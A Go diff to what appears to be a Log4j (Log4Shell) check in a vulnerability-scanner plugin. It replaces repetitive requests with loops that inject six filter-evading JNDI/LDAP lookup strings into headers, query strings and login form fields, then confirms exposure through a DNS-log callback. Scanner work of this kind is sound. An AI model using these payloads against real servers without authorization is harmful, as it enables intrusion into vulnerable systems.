@@ -4,7 +4,6 @@ import (
 	"fmt"
 	plugin "github.com/deenrookie/kunpeng-plus/pocs"
 	"github.com/deenrookie/kunpeng-plus/utils"
-	"github.com/opensec-cn/kunpeng/util"
 	"net/http"
 	"strings"
 	"time"
@@ -43,131 +42,90 @@ func (d *log4jRCE) GetResult() []plugin.Plugin {
 
 func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	_ = meta
-
-	randStr := utils.RandStringRunes(8)
-	mainPayload := fmt.Sprintf("${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://%s.%s/} ?a=x&d=ax", randStr, utils.DNS_LOG_DOMAIN)
-
-	request, _ := http.NewRequest("GET", URL, nil)
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	request, _ = http.NewRequest("GET", URL+"?id="+mainPayload, nil)
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL, strings.NewReader(postData))
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	postData = fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL+"/login", strings.NewReader(postData))
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	postData = fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL+"/signin", strings.NewReader(postData))
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	request, _ = http.NewRequest("GET", URL+"?id="+mainPayload, nil)
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	request, _ = http.NewRequest("GET", URL+"/admin?id="+mainPayload, nil)
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("Referer", mainPayload)
-	request.Header.Set("Origin", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
-
-	request, _ = http.NewRequest("GET", URL+"/admin?id="+mainPayload, nil)
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
+	// count := 0
+	randStr := utils.RandStringRunes(10)
+	payloads := []string{
+		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
+		"${jndi:lda${:-}p://",
+		"${j${aaa::::-n}di:ldap://}",
+		"${j${aaa::::-n}d${:-}i:ldap://}",
+		"${j${aaa::::-n}d${:-}i:ldap://}",
+		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-}p://",
+	}
 	
-	postData = fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL+"/admin", strings.NewReader(postData))
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
+	reqPaths := []string{
+		"/admin",
+		"/login",
+		"/signin",
+	}
 
-	postData = fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL, strings.NewReader(postData))
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
+	headers := []string{
+		"Origin",
+		"Referer",
+	}
 
-	postData = fmt.Sprintf("id=%s&payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL+"/login", strings.NewReader(postData))
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
+	methods := []string{
+		"GET",
+		"POST",
+	}
 
-	postData = fmt.Sprintf("id=%s&payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload, mainPayload)
-	request, _ = http.NewRequest("POST", URL+"/signin", strings.NewReader(postData))
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	request.Header.Set("X-Forwarded-For", mainPayload)
-	request.Header.Set("Client-ip", mainPayload)
-	request.Header.Set("Cookie", mainPayload)
-	request.Header.Set("Authorization", mainPayload)
-	request.Header.Set("User-Agent", mainPayload)
-	_, _ = util.RequestDo(request, true)
+	client := http.Client{
+		//Transport: &http.Transport{
+		//	// 设置代理
+		//	Proxy: http.ProxyURL(uri),
+		//},
+	}
+	// fmt.Println(randStr)
 
-	time.Sleep(time.Duration(4) * time.Second)
+	for _, payload := range payloads {
+		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
+		for _, reqPath := range reqPaths {
+			for _, method := range methods {
+				var request *http.Request
+				if method == "POST" {
+					postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", fullPayload, fullPayload, fullPayload)
+					request, _ = http.NewRequest(method, URL+reqPath, strings.NewReader(postData))
+				} else {
+					request, _ = http.NewRequest(method, URL+reqPath, nil)
+				}
+				// fmt.Println(count)
+				for _, header := range headers {
+					request.Header.Set(header, fullPayload)
+					request.Header.Set("User-Agent", fullPayload)
+					request.Header.Set("X-Forwarded-For", fullPayload)
+					request.Header.Set("Client-ip", fullPayload)
+					request.Header.Set("Cookie", fullPayload)
+					request.Header.Set("Authorization", fullPayload)
+					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+					_, _ = client.Do(request)
+				}
+
+				request, _ = http.NewRequest(method, URL+reqPath + "?id=" + fullPayload, nil)
+				for _, header := range headers {
+					request.Header.Set(header, fullPayload)
+					request.Header.Set("User-Agent", fullPayload)
+					request.Header.Set("X-Forwarded-For", fullPayload)
+					request.Header.Set("Client-ip", fullPayload)
+					request.Header.Set("Cookie", fullPayload)
+					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+					request.Header.Set("Authorization", fullPayload)
+					_, _ = client.Do(request)
+				}
+				// fmt.Println(count)
+				// count++
+				if utils.IsExistDNSLog(randStr) {
+					result := d.info
+					result.Response = "TEST"
+					result.Request = "TEST"
+					d.result = append(d.result, result)
+					return true
+				}
+			}
+		}
+
+	}
+
+	time.Sleep(time.Duration(6) * time.Second)
 
 	if utils.IsExistDNSLog(randStr) {
 		result := d.info
